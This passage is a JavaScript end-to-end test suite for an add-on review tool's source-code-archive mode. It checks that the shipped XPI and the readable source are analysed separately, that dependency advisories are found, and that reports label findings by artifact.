// End-to-end test for SCA mode (source code archive): the positional XPI is the
// SHIPPED artifact (manifest.json + reachability + WAR + bundled-files resolve against
// it), while the readable --sca-package-root archive is the review target the code checks
// analyze. The built layout deliberately differs from the source layout - the XPI's
// entry scripts are named differently than the source's - which is the case that
// stresses the shipped/review-target split.

import { test, mock } from "node:test";
import { REVIEW_MODE } from "../../src/lib/enum.js";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { formatText } from "../../src/report/format.js";
import { loadRegistry } from "../../src/checks/registry.js";
import { isQuestion, orderReview } from "../../src/report/order.js";
import { SEVERITY } from "../../src/report/finding.js";
import {
  cdnMissCache,
  fixtureCacheOpts,
  freshWorkFolder,
  loadAndReview,
  osvEntries,
  popularityEntries,
  seedCdnHits,
  seedWorkCache,
} from "../seed-caches.js";
import { defaultWorkFolder, workPaths } from "../../src/util/dest.js";
import {
  advisory,
  answer,
  auditCache,
  auditEntries,
  buildInto,
  realBuildCheck,
  writeBuildReport,
} from "../build-checked.js";
import { copySource, loadTheXpi } from "../../src/review/start.js";
import {
  MODE,
  addToRecord,
  modeOf,
  readRecord,
  writeRecord,
} from "../../src/review/record.js";
import { BUILD_CHECK_STEP, buildResults } from "../../src/build-check/state.js";
import { handBack } from "../../src/build-check/steps.js";
import { reviewFile, writeReviewFile } from "../../src/report/handback.js";
import {
  approveScaFolders,
  scaFoldersMisfit,
  settlePackageRoot,
  ScaFoldersRejected,
} from "../../src/addon/package-root.js";
import { isExperiment } from "../../src/lib/util.js";
import {
  populateCtx,
  reviewLoadedSubmission,
  runTheNormalChecks,
} from "../../src/pipeline.js";
import { reviewDetails } from "../../src/report/loop.js";

// A cache pre-seeded from the fixtures so the schema / experiments / library-hash
// fetches all hit disk - these runs stay offline.
const OFFLINE = fixtureCacheOpts();

/** A review in a fresh work folder of its own, loaded first as every review is - unless the
 *  test names the folder itself. */
function runReview(opts) {
  return loadAndReview(opts);
}

/**
 * An agent's review started as the command line starts one (src/cli.js): the load, unless the
 * folder already holds the add-on's copy, what the run was given added to the record, a source
 * copied into sca/ and its package root settled from the hints (relative to the source), then
 * the review of the loaded submission with an agent running it. A source review whose
 * early-exit checks pass stops at its build check's `analyze`.
 * @param {object} opts  runPipeline's options, `scaExtracted` and `scaHints` among them.
 * @returns {Promise<{work: string, record: object, opts: object}>}  The work folder, its
 *   record as the run left it, and the options the review ran with.
 */
async function startAgentReview(opts) {
  const { scaExtracted, scaHints = {}, ...rest } = opts;
  const work = rest.workFolder ?? freshWorkFolder();
  // The build check's audit reads the run cache its record names, as the review does.
  const workCache = scaExtracted ? (rest.workCache ?? auditCache()) : undefined;
  const flags = {
    ...(rest.checksOnly ? { "checks-only": rest.checksOnly.join(",") } : {}),
    ...(rest.checksSkip ? { "checks-skip": rest.checksSkip.join(",") } : {}),
    ...(workCache ? { "cache-work-dir": workCache } : {}),
  };
  if (!fs.existsSync(workPaths(work).xpi)) {
    const loaded = loadTheXpi(rest.addonPath, work);
    addToRecord(work, loaded.record, {
      submission: {
        xpi: rest.addonPath,
        experiments: isExperiment(loaded.manifest.json),
      },
      kind: scaExtracted ? "sca" : "xpi",
      flags,
      folders: { xpi: workPaths(work).xpi },
    });
  }
  let settled = null;
  if (scaExtracted) {
    const sca = copySource(work, scaExtracted);
    addToRecord(work, readRecord(work), { folders: { sca } });
    settled = settlePackageRoot(sca, scaHints);
  }
  const reviewOpts = {
    ...rest,
    llmReview: true,
    workFolder: work,
    ...(workCache ? { workCache } : {}),
    ...(settled ? { scaFolders: settled.folders } : {}),
    ...(settled?.moved ? { scaMoved: settled.moved } : {}),
  };
  await reviewLoadedSubmission({
    opts: reviewOpts,
    llm: true,
    format: null,
    record: readRecord(work),
  });
  return { work, record: readRecord(work), opts: reviewOpts };
}

/**
 * An agent's review carried through its build check where one started (startAgentReview): the
 * build report written and judged safe, the agent let build, an empty build made in build/
 * that does not match the XPI, or the build check done at once where a guard check is off.
 * Then the review started as the hand-back starts it once the build check is done (src/cli.js
 * buildCheckCase): the build results added to the record, and the normal checks run over the
 * folders the build check left.
 * @param {object} opts  As startAgentReview takes them.
 * @returns {Promise<{work: string, record: object, review: object}>}  The work folder, its
 *   record, and the review: the loop's in mode review, else the record's permanent one.
 */
async function agentReview(opts) {
  const started = await startAgentReview(opts);
  const { work } = started;
  let record = started.record;
  if (modeOf(record) === MODE.buildCheck) {
    const registry = loadRegistry();
    answer(work, {});
    writeBuildReport(work);
    let out = await handBack(work, record, registry);
    while (out.next === "step") {
      writeRecord(work, out.record);
      writeReviewFile(workPaths(work).answers, reviewFile(out.entries));
      const step = out.record.current.step;
      assert.ok(
        step === BUILD_CHECK_STEP.permission || step === BUILD_CHECK_STEP.build,
        `a clean source is built, not at ${step}`
      );
      answer(
        work,
        step === BUILD_CHECK_STEP.build
          ? {
              LLM_BUILD_OUTPUT: buildInto(workPaths(work).buildCopy),
              LLM_BUILD_XPI_MATCH: "no match",
            }
          : {}
      );
      out = await handBack(work, readRecord(work), registry);
    }
    const done = addToRecord(work, out.record, {
      build: buildResults(work, out.record.current),
    });
    const opts2 = {
      ...started.opts,
      scaFolders: done.build.roots,
      verification: done.verification ?? null,
    };
    const ctx = await populateCtx(opts2, workPaths(work), done.build);
    await runTheNormalChecks(ctx, {
      opts: opts2,
      llm: true,
      format: null,
      record: done,
      earlyIds: done.earlyExit?.checksRun ?? [],
    });
    record = readRecord(work);
  }
  const review = record.current?.report ? record.current : record.review;
  return { work, record, review };
}

function tmpDir(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-sca-"));
  for (const [name, content] of Object.entries(files)) {
    const dest = path.join(dir, name);
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, content);
  }
  return dir;
}

// The SHIPPED XPI: built entry scripts (background.js / content.js) that load a
// web-accessible resource. This is a self-consistent built add-on. background.js ships
// MINIFIED (first-party, one dense line) so the XPI is not directly reviewable - which is
// what makes an SCA submission legitimate. An XPI whose first-party code is readable is
// still reviewed as SCA. Minified here also keeps the shipped bytes unlike the archive's,
// so sca-xpi-fully-included-in-archive stays out of these tests.
const XPI_FILES = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "SCA E2E",
    version: "1.0",
    background: { scripts: ["background.js"] },
    content_scripts: [{ matches: ["*://*/*"], js: ["content.js"] }],
    web_accessible_resources: [
      { resources: ["injected.js"], matches: ["*://*/*"] },
    ],
  }),
  "background.js": `var s=0;${"s=s+1;".repeat(240)}console.log("built bg",s);`,
  "content.js": `const u=browser.runtime.getURL("injected.js");const s=document.createElement("script");s.src=u;document.head.append(s);`,
  "injected.js": `console.log("built injected");`,
};

// The same shipped add-on declaring an Experiment, reviewed with experiments allowed: what
// a source review naming --sca-experiments is of.
const EXPERIMENT_XPI_FILES = {
  ...XPI_FILES,
  "manifest.json": JSON.stringify({
    ...JSON.parse(XPI_FILES["manifest.json"]),
    experiment_apis: { myapi: {} },
  }),
};

// The readable SOURCE: a different pre-build layout (entry file named main.js, not
// the manifest.json's background.js), carrying a real WebExtension API defect.
const SRC_FILES = {
  "package.json": JSON.stringify({ name: "sca-e2e", version: "1.0.0" }),
  // A source submission owes a lock whatever its package.json declares, and without one the
  // review is aborted early - which would withhold the very manual-review items these tests
  // assert on. Empty is enough: nothing here declares a dependency to cover.
  "package-lock.json": JSON.stringify({
    lockfileVersion: 3,
    packages: { "": {} },
  }),
  "src/main.js": `browser.totallyFakeNamespace.doThing();\n`,
  "src/content.js": `browser.runtime.getURL("injected.js");\n`,
  "src/injected.js": `console.log("source injected");\n`,
};

const has = (findings, ruleId, pred = () => true) =>
  findings.some((f) => f.ruleId === ruleId && pred(f));

// unknown-api escalates rather than rejecting, so a probe asking "did the code checks
// review this file" reads the escalation list. Same shape as `has`, other array.
const hasItem = (meta, ruleId, pred = () => true) =>
  (meta.manualReview ?? []).some((m) => m.ruleId === ruleId && pred(m));

// A FLAT layout: manifest.json + the source + the build tooling all sit at --sca-package-root.
// The whole submission is accepted and fully reviewed: the code checks review it, and the
// build review still traces the build off the root package.json (so a root build fault is
// caught).
const FLAT_SRC = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "Flat",
    version: "1.0",
    background: { scripts: ["app.js"] },
  }),
  "app.js": `browser.totallyFakeNamespace.doThing();\n`,
  "package.json": JSON.stringify({
    name: "flat-sca",
    version: "1.0.0",
    scripts: { build: "web-ext build" },
  }),
  // A source submission owes a lock, and without one the review stops at its lock check,
  // before the code checks these tests are about. Empty is enough: nothing is declared.
  "package-lock.json": JSON.stringify({
    lockfileVersion: 3,
    packages: { "": {} },
  }),
};

// A WRAPPED layout: the node project sits in a folder of the extracted archive, and code the
// build takes from beside it lies outside that folder. The review reads the whole extracted
// archive, so that code is reviewed too, and every path is given from the archive's top: the
// package checks still read the package root's package.json and lock, and point at them there.
test("SCA e2e: a wrapped archive is reviewed whole, its package files read in the package root", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    // No lock, so the one finding that names the package root's package file shows where.
    ...Object.fromEntries(
      Object.entries(FLAT_SRC)
        .filter(([name]) => name !== "package-lock.json")
        .map(([name, body]) => [`pkg/${name}`, body])
    ),
    "shared/helper.js": `browser.anotherFakeNamespace.call();\n`,
  });
  try {
    const workFolder = freshWorkFolder();
    const { findings, meta } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      workFolder,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.equal(
      meta.scaFolders.packageRoot,
      path.join(workPaths(workFolder).sca, "pkg"),
      "the package root is found, in the copy the review reads"
    );
    assert.ok(
      hasItem(
        meta,
        "unknown-api",
        (m) =>
          m.file === "shared/helper.js" && /anotherFakeNamespace/.test(m.item)
      ),
      "code beside the package root is reviewed, at its place in the archive"
    );
    assert.ok(
      hasItem(meta, "unknown-api", (m) => m.file === "pkg/app.js"),
      "the package root's own code is reviewed at its place in the archive"
    );
    // The lock is owed by the package root's package.json, and named there.
    assert.ok(
      has(
        findings,
        "sca-lock-file-missing",
        (f) => f.file === "pkg/package.json"
      ),
      findings.map((f) => `${f.ruleId} ${f.file}`).join(", ")
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: a flat layout is accepted and fully reviewed", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(FLAT_SRC);
  try {
    {
      const { findings, meta } = await runReview({
        addonPath: xpi,
        scaExtracted: src,
        ...OFFLINE,
        cdnLookupCache: cdnMissCache(xpi, src),
      });
      assert.equal(
        meta.reviewed,
        true,
        "the flat submission is reviewed, not rejected"
      );
      // The code checks review the root source: the fake API in app.js is caught.
      assert.ok(
        hasItem(
          meta,
          "unknown-api",
          (m) => m.file === "app.js" && /totallyFakeNamespace/.test(m.item)
        ),
        "the root source file is reviewed by the code checks"
      );
      // The build review works flat: it anchors at the root package.json, and the check
      // that reads it ran.
      assert.ok(
        meta.checksRun.includes("build-review"),
        "the build review runs in a flat layout"
      );
      assert.ok(!has(findings, "sca-lock-file-missing"), "its lock is there");
    }
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// The rendered SCA report labels each finding's file:line by artifact and closes the
// Issues section with the legend footer - proving every finding runPipeline produces
// names the artifact it is about, and that `mode` is threaded into the report. An XPI
// review has neither.
test("SCA e2e: the rendered report carries [XPI]/[SCA] labels + the footer", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...FLAT_SRC,
    "app.js": `browser.totallyFakeNamespace.doThing();\n`, // a source (SCA) finding
  });
  try {
    const result = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    const report = formatText(result);
    assert.match(
      report,
      /\[SCA\] app\.js/,
      "a source finding is labelled [SCA]"
    );
    assert.match(
      report,
      /\[XPI\] = source file in the submitted XPI/,
      "the Issues section closes with the artifact legend"
    );
    // The pipeline exposes the mode, and every finding carries the artifact it is
    // about - the fact the label above was rendered from, not re-derived.
    assert.equal(result.mode, REVIEW_MODE.SCA);
    // The label above was rendered from a field on the finding, not worked out by the
    // renderer. The constructor refuses a finding that cannot say where its subject is,
    // so this pins which artifact each one named rather than that it named any.
    const stamped = result.findings.map((f) => f.artifact);
    assert.ok(
      stamped.every((a) => a === "XPI" || a === "SCA"),
      "every finding carries one of the two artifacts"
    );
    // The [SCA] app.js line above is an ESCALATED case, not a finding, so this also
    // pins the other half of the stamp: a manual item carries the artifact too, set
    // where the case was raised (src/checks/escalation.js manualRef).
    const manual = result.meta.manualReview ?? [];
    assert.equal(
      manual.find((m) => m.file === "app.js").artifact,
      "SCA",
      "the source case the report labelled [SCA] carries SCA"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// MODE-INVARIANCE: the built XPI is analysed the SAME way whether it is reviewed inside an
// SCA submission (a second artifact) or as a standalone XPI review (the review target). So
// the input:xpi checks - which read siblings.xpi's classification, reachability and
// api-usage - must produce the IDENTICAL findings for the same XPI in either mode. That is
// the whole point of building siblings.xpi one way regardless of mode; without it an
// input:xpi finding could silently depend on how the run was invoked.
test("SCA e2e: the built XPI's input:xpi findings match a standalone XPI review of it", async () => {
  // orphan.js is unreferenced in the XPI -> a deterministic unused-files (input:xpi) finding,
  // so the comparison is non-vacuous.
  const xpi = tmpDir({
    ...XPI_FILES,
    "orphan.js": `console.log("nobody imports me");\n`,
  });
  const src = tmpDir(SRC_FILES);
  try {
    const cdnLookupCache = cdnMissCache(xpi, src);
    const sca = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache,
    });
    const xpiOnly = await runReview({
      addonPath: xpi,
      ...OFFLINE,
      cdnLookupCache,
    });
    assert.equal(
      sca.mode,
      REVIEW_MODE.SCA,
      "the minified XPI keeps the review in SCA mode"
    );

    // The findings from input:xpi rules only. Asked of the REGISTRY, which answers the
    // same in both runs - a finding's own `artifact` cannot serve here, because in a
    // standalone XPI review there is one artifact and every finding carries it. In that
    // review the source IS the XPI, so its input:source checks also run, and filtering to
    // the input:xpi route is what isolates the shipped-artifact analysis.
    const registry = loadRegistry();
    const xpiFindings = (r) =>
      r.findings
        .filter((f) => registry.inputFor(f.ruleId) === "xpi")
        .map((f) => `${f.ruleId}|${f.file}|${f.item ?? f.loc ?? ""}`)
        .sort();

    const inSca = xpiFindings(sca);
    assert.ok(
      inSca.includes("unused-files|orphan.js|"),
      "the orphaned XPI file is flagged unused (a real input:xpi finding fired)"
    );
    assert.deepEqual(
      inSca,
      xpiFindings(xpiOnly),
      "the built XPI's input:xpi findings are identical in SCA and standalone-XPI review"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// --sca-package-root is the whole of it: the flag switches SCA mode on AND names the review source,
// so a submission needs only the one.
test("SCA e2e: --sca-package-root alone switches to SCA mode and is the review source", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(FLAT_SRC);
  try {
    const { findings, meta } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.equal(
      meta.reviewed,
      true,
      "SCA mode engaged from --sca-package-root alone"
    );
    // The root source is reviewed (proves mode === "sca", source === the root).
    assert.ok(
      hasItem(
        meta,
        "unknown-api",
        (m) => m.file === "app.js" && /totallyFakeNamespace/.test(m.item)
      ),
      "the root source file is reviewed"
    );
    // The source checks ran (SCA-only): the archive's lock check is among them.
    assert.ok(
      meta.checksRun.includes("sca-lock-file-missing"),
      "the SCA checks ran with --sca-package-root alone"
    );
    assert.ok(!has(findings, "sca-lock-file-missing"), "and the lock is there");
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A committed npm lock declaring one build dependency, `build-tool`, installed for the build
// only - what a source review reads its dependencies from.
const BUILD_TOOL_LOCK = JSON.stringify({
  name: "sca-e2e",
  version: "1.0.0",
  lockfileVersion: 3,
  requires: true,
  packages: {
    "": {
      name: "sca-e2e",
      version: "1.0.0",
      devDependencies: { "build-tool": "1.0.0" },
    },
    "node_modules/build-tool": { version: "1.0.0", dev: true },
  },
});

/**
 * A run cache folder holding OSV's answer to the lock audit's batch: one HIGH advisory for
 * `build-tool`, fixed in 2.0.0, and that advisory's record when it is hydrated. npm's
 * download count for it is too low to be popular.
 * @param {string} id  The advisory id.
 * @returns {string} The folder, for the review's workCache.
 */
function buildToolAdvisoryCache(id) {
  const advisory = {
    id,
    aliases: ["CVE-2021-0001"],
    database_specific: { severity: "HIGH" },
    affected: [
      {
        package: { ecosystem: "npm", name: "build-tool" },
        ranges: [
          {
            type: "SEMVER",
            events: [{ introduced: "0" }, { fixed: "2.0.0" }],
          },
        ],
      },
    ],
  };
  return seedWorkCache({
    osv: osvEntries({
      batch: { "build-tool@1.0.0": { vulns: [{ id }] } },
      advisories: { [id]: advisory },
    }),
    popularity: popularityEntries({ npm: { "build-tool": { downloads: 0 } } }),
  });
}

// The dependency audit reads the root lock file, which in a flat layout IS the review
// addon's own - so resolveVendor + the vendor checks run exactly as in a nested layout. A
// vulnerable build dependency is surfaced by vendor-vulnerable-dev.
test("SCA e2e: a flat layout audits the root lock file's dependencies", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...FLAT_SRC,
    "package.json": JSON.stringify({
      name: "flat-sca",
      version: "1.0.0",
      devDependencies: { "build-tool": "1.0.0" },
    }),
    "package-lock.json": BUILD_TOOL_LOCK,
  });
  const workCache = buildToolAdvisoryCache("GHSA-flat-0000-0000");
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      workCache,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(
      has(findings, "vendor-vulnerable-dev", (f) => /build-tool/.test(f.item)),
      "the root lock file's dependencies are audited in a flat layout"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

/** jsDelivr's answer for the bundled library of the two tests below: npm's leftpad. */
const LEFTPAD_HIT = {
  type: "npm",
  name: "leftpad",
  version: "1.0.0",
  file: "/lib.min.js",
};

/** npm's download count for leftpad, enough to be popular. */
const LEFTPAD_POPULARITY = popularityEntries({
  npm: { leftpad: { downloads: 50000 } },
});

// A third-party library bundled into the readable SOURCE (a committed copy the Mozilla
// hash DB misses) that is NOT declared in package.json is identified by its jsDelivr
// content hash and audited on OSV, so a vulnerable one is caught by vendor-vulnerable.
test("SCA e2e: an undeclared source-bundled library is OSV-audited", async () => {
  const LIB = `var s=0;${"s=s+1;".repeat(240)}`; // one dense line of statements -> minified
  const { rawSha256 } = await import("../../src/normalize/hash.js");
  const libHash = rawSha256(Buffer.from(LIB));
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      background: { scripts: ["app.js"] },
    }),
    "app.js": "console.log('app');\n",
    "vendor/lib.min.js": LIB, // undeclared: not in package.json
    "package.json": JSON.stringify({ name: "l", version: "1.0.0" }),
    "package-lock.json": JSON.stringify({
      lockfileVersion: 3,
      packages: { "": {} },
    }),
  });
  // jsDelivr knows the vendored file's hash (a popular package), and OSV holds an advisory
  // for it - so it is identified AND audited.
  const cdnCache = seedCdnHits(cdnMissCache(xpi, src), {
    [libHash]: LEFTPAD_HIT,
  });
  const workCache = seedWorkCache({
    osv: osvEntries({
      query: {
        "leftpad@1.0.0": {
          vulns: [
            {
              id: "GHSA-lib-0000-0000",
              aliases: ["CVE-2020-0001"],
              database_specific: { severity: "HIGH" },
              affected: [
                {
                  package: { ecosystem: "npm", name: "leftpad" },
                  ranges: [
                    {
                      type: "SEMVER",
                      events: [{ introduced: "0" }, { fixed: "2.0.0" }],
                    },
                  ],
                },
              ],
            },
          ],
        },
      },
    }),
    popularity: LEFTPAD_POPULARITY,
  });
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      workCache,
      cdnLookupCache: cdnCache,
    });
    assert.ok(
      has(findings, "vendor-vulnerable", (f) => /leftpad/.test(f.item ?? "")),
      "the undeclared source-bundled library is OSV-audited"
    );
  } finally {
    [xpi, src, cdnCache].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

// The same undeclared library, identified on jsDelivr, is a library and not authored
// code, so minified-code leaves it alone. "a minified file in the source is rejected by
// minified-code" below is the miss case with the same bytes.
test("SCA e2e: an undeclared source-bundled library the CDN identifies is not rejected as minified", async () => {
  const LIB = `var s=0;${"s=s+1;".repeat(240)}`; // one dense line of statements -> minified
  const { rawSha256 } = await import("../../src/normalize/hash.js");
  const libHash = rawSha256(Buffer.from(LIB));
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      background: { scripts: ["app.js"] },
    }),
    "app.js": "console.log('app');\n",
    "vendor/lib.min.js": LIB, // undeclared: not in package.json
    "package.json": JSON.stringify({ name: "l", version: "1.0.0" }),
    "package-lock.json": JSON.stringify({
      lockfileVersion: 3,
      packages: { "": {} },
    }),
  });
  // jsDelivr knows the vendored file's hash (a popular package), and OSV has no advisory
  // for it, so the review runs to minified-code.
  const cdnCache = seedCdnHits(cdnMissCache(xpi, src), {
    [libHash]: LEFTPAD_HIT,
  });
  const workCache = seedWorkCache({
    osv: osvEntries({ query: { "leftpad@1.0.0": {} } }),
    popularity: LEFTPAD_POPULARITY,
  });
  try {
    const { findings, meta } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      workCache,
      cdnLookupCache: cdnCache,
    });
    assert.ok(
      meta.checksRun.includes("minified-code"),
      "the review reaches minified-code"
    );
    assert.ok(
      !has(findings, "minified-code", (f) => /lib\.min\.js/.test(f.file)),
      "the CDN-identified source library is not rejected as minified"
    );
  } finally {
    [xpi, src, cdnCache].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

// The folder named is copied into sca/ as it is (copyTheSource) and never walked, and the
// copy is read ONCE and shared by the review and the build review (loadSourceArchive, then
// analyzeBuild over the same view), so it is not walked (nor its symlinks warned) twice - a
// loadAddon(scaPackageRoot) per reader would read the root twice.
test("SCA: the source is copied, and the copy is read once, not twice", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  // Built before the count starts: making it walks the source too.
  const cdnLookupCache = cdnMissCache(xpi, src);
  const workFolder = freshWorkFolder();
  const copy = workPaths(workFolder).sca;
  const realReaddir = fs.readdirSync;
  let given = 0;
  let copied = 0;
  mock.method(fs, "readdirSync", (p, ...rest) => {
    if (path.resolve(p) === path.resolve(src)) {
      given += 1;
    }
    if (path.resolve(p) === copy) {
      copied += 1;
    }
    return realReaddir(p, ...rest);
  });
  try {
    await runReview({
      addonPath: xpi,
      scaExtracted: src,
      workFolder,
      ...OFFLINE,
      cdnLookupCache,
    });
    assert.equal(given, 0, "the folder named is copied, never walked");
    assert.equal(copied, 1, "the copy is walked once, not twice");
  } finally {
    mock.restoreAll();
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// WHY loadSourceArchive reads no manifest.json while the XPI is loaded with one: the two
// artifacts answer "what is this add-on's manifest.json" differently, and only one of them is
// allowed to. The XPI's is what Thunderbird loads, so it is the review's one authority. A
// source archive's is a PRE-BUILD template - the build may rewrite it, generate it, or draw
// the add-on's real root from somewhere else, and a submission need not hold one at all - so
// whatever it says is at best unconfirmed and at worst a different add-on.
//
// The FILE is among the archive's files, like every other file the submission contains. What
// keeps the two apart is the RECORD: ctx.manifest is projected from the XPI by name
// (src/pipeline.js), and no artifact carries a record of its own at all
// (src/checks/context.js), so the archive's own record is unreachable from a check even if
// one existed. Both halves are pinned in tests/unit/context.test.js, where a deliberately
// leaking record has to come back undefined - there is nothing left for a pipeline-level
// test to distinguish, since no run can put that template in front of a check.

// What the report and the machine-readable document SAY was reviewed: the shipped add-on,
// and separately the two values the run was given. Named by ARTIFACT rather than by role,
// each a real path, and none of them fused: a source gluing its subtree on with a colon
// ("<root>:src") is a value no reader could resolve and none could split back,
// since a directory name may hold one. The subtree is normalised the way the loader
// normalises it, so the value names what was read whichever spelling the flag was given.
test("SCA meta names the artifacts, each a real path", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  try {
    const workFolder = freshWorkFolder();
    const { meta } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      workFolder,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.equal(meta.xpi, xpi);
    // The review reads its own copy of the source, in the work folder.
    const copy = workPaths(workFolder).sca;
    assert.deepEqual(meta.scaFolders, {
      source: copy,
      used: copy,
      packageRoot: copy,
    });
    // Absolute, like every other path here: the flag's spellings are resolved by the
    // arg-array reader (src/cli.js), and what reaches meta is the folder that was read.
    for (const value of [meta.xpi, meta.scaFolders.packageRoot]) {
      assert.equal(fs.existsSync(value), true, `${value} is a real path`);
    }
    // The Experiment folder is there exactly for an Experiment. It is also the only place a
    // reader learns that a subtree was excluded from the WebExtension checks, and which one.
    const expXpi = tmpDir(EXPERIMENT_XPI_FILES);
    const expWork = freshWorkFolder();
    const { meta: withExp } = await runReview({
      workFolder: expWork,
      addonPath: expXpi,
      scaExtracted: src,
      scaHints: { experiments: "src/experiments" },
      allowExperiments: true,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(expXpi, src),
    });
    fs.rmSync(expXpi, { recursive: true, force: true });
    assert.equal(
      withExp.scaFolders.experiments,
      path.join(workPaths(expWork).sca, "src", "experiments")
    );

    // The fields a role-named meta carried, and the fused value with them.
    assert.equal(meta.addon, undefined);
    assert.equal(meta.shippedAddon, undefined);
    assert.equal(meta.addonKind, undefined);
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// The two files a --llm-review run NAMES and this tool never writes: the summary report,
// and - only in a source code review - what building the add-on takes, which the build
// check's agent wrote. Both sit in the review's work folder under their bare names, beside
// the review's own files, and never inside the submitted add-on. The build one is gated on
// the review being a source code one, not on --llm-skip-summary, which withholds the
// description alone.
test("an SCA --llm-review names a build report in the work folder", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  const work = freshWorkFolder();
  try {
    const { review } = await agentReview({
      addonPath: xpi,
      scaExtracted: src,
      workFolder: work,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    const { meta } = review.report;
    assert.equal(meta.buildFile, path.join(work, "build.md"));
    assert.equal(meta.summaryFile, path.join(work, "summary.md"));
    assert.equal(meta.reportFile, path.join(work, "report.md"));
    assert.equal(meta.xpiRoot, `${path.join(work, "xpi")}${path.sep}`);
    // Named, never written by this tool: the build check's agent wrote build.md, and the
    // description is the review's agent's to write.
    assert.equal(fs.existsSync(meta.summaryFile), false);

    // An XPI review has no build to reproduce, so it names none - but every review has a
    // report, and that one this tool writes itself, so it is named either way.
    const xpiOnly = await agentReview({
      addonPath: xpi,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi),
    });
    assert.equal(xpiOnly.review.report.meta.buildFile, undefined);
    assert.equal(
      path.basename(xpiOnly.review.report.meta.reportFile),
      "report.md"
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// The review builds the source itself only where every check a build relies on ran: with
// one switched off, by --checks-skip or by a --checks-only that leaves it out, nothing
// vouches for what the build would install, so the run record says so.
test("an SCA --llm-review records whether its build is guarded", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  const guarded = async (selection) => {
    const { review } = await agentReview({
      addonPath: xpi,
      scaExtracted: src,
      ...selection,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    return review.run["build-guarded"] === true;
  };
  try {
    assert.equal(await guarded({}), true);
    assert.equal(
      await guarded({ checksSkip: ["vendor-vulnerable-indirect-dev"] }),
      false
    );
    assert.equal(await guarded({ checksOnly: ["lockfile-injection"] }), false);
    assert.equal(
      await guarded({ checksOnly: loadRegistry().buildGuardIds() }),
      true
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: code checks review the source; manifest/WAR resolve against the XPI", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  try {
    const result = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    const { findings } = result;

    // (1) Code checks review ALL the source: a fake API in main.js - a file the
    // XPI manifest.json never names (so it is unreachable from the built entry points) -
    // is still caught, because the SCA code checks review every source file.
    assert.ok(
      hasItem(
        result.meta,
        "unknown-api",
        (m) => m.file === "src/main.js" && /totallyFakeNamespace/.test(m.item)
      ),
      "expected unknown-api on the non-entry source file main.js"
    );

    // (2) bundled-files resolves manifest.json refs against the XPI: background.js is a
    // built entry present in the XPI but absent from the source tree, so it must
    // NOT be reported as "not bundled".
    assert.ok(
      !has(findings, "bundled-files", (f) => /background\.js/.test(f.item)),
      "background.js (a built entry) must not be flagged as unbundled"
    );

    // (3) minimize-WAR / reachability judged over the XPI: injected.js is loaded by
